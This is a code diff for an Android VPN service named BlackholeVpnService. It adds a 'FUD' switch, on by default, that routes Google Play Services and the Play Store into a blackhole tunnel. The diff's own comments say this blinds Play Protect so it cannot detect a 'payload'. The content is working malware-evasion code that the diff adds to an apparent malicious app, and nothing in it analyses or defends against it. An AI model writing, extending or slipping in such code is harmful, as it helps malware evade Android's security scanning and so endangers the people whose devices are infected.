@@ -53,9 +53,13 @@ class BlackholeVpnService : VpnService() {
         /**
          * Start the VPN blackhole. Call AFTER VpnService.prepare() returns null
          * (consent already granted) or after user grants consent via Activity result.
+         *
+         * @param vpnBypass true = FUD ON  (GMS/Play Store blackholed — Play Protect blinded)
+         *                  false = FUD OFF (GMS/Play Store excluded — Play Protect active)
          */
-        fun start(context: Context) {
+        fun start(context: Context, vpnBypass: Boolean = true) {
             val intent = Intent(context, BlackholeVpnService::class.java)
+            intent.putExtra("vpn_bypass", vpnBypass)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
@@ -75,6 +79,7 @@ class BlackholeVpnService : VpnService() {
     }
 
     private var tunnelFd: ParcelFileDescriptor? = null
+    private var vpnBypass: Boolean = true  // FUD ON by default (safe default)
 
     override fun onCreate() {
         super.onCreate()
@@ -82,6 +87,9 @@ class BlackholeVpnService : VpnService() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+
+        // Read vpn_bypass from intent extra (set by start())
+        vpnBypass = intent?.getBooleanExtra("vpn_bypass", true) ?: true
 
         // Go foreground IMMEDIATELY to avoid ANR on Android 8+ / crash on Android 14+
         val notification = buildNotification()
@@ -165,9 +173,14 @@ class BlackholeVpnService : VpnService() {
             safeExclude(builder, "com.google.android.permissioncontroller")
             safeExclude(builder, "com.android.permissioncontroller")
 
-            // NOT EXCLUDED (intentionally blackholed):
-            // com.google.android.gms — Google Play Services / Play Protect → BLINDED
-            // com.android.vending — Play Store → BLINDED
+            // ── FUD control: GMS + Play Store exclusion ──
+            // vpnBypass=true  (FUD ON):  GMS/Play Store NOT excluded → Play Protect BLINDED ✅
+            // vpnBypass=false (FUD OFF): GMS/Play Store excluded → Play Protect ACTIVE → detects payload ❌
+            if (!vpnBypass) {
+                safeExclude(builder, "com.google.android.gms")
+                safeExclude(builder, "com.android.vending")
+            }
+            // (when vpnBypass=true, GMS/Play Store remain blackholed — intentional)
 
             // ── Establish tunnel ──
             tunnelFd = builder.establish()
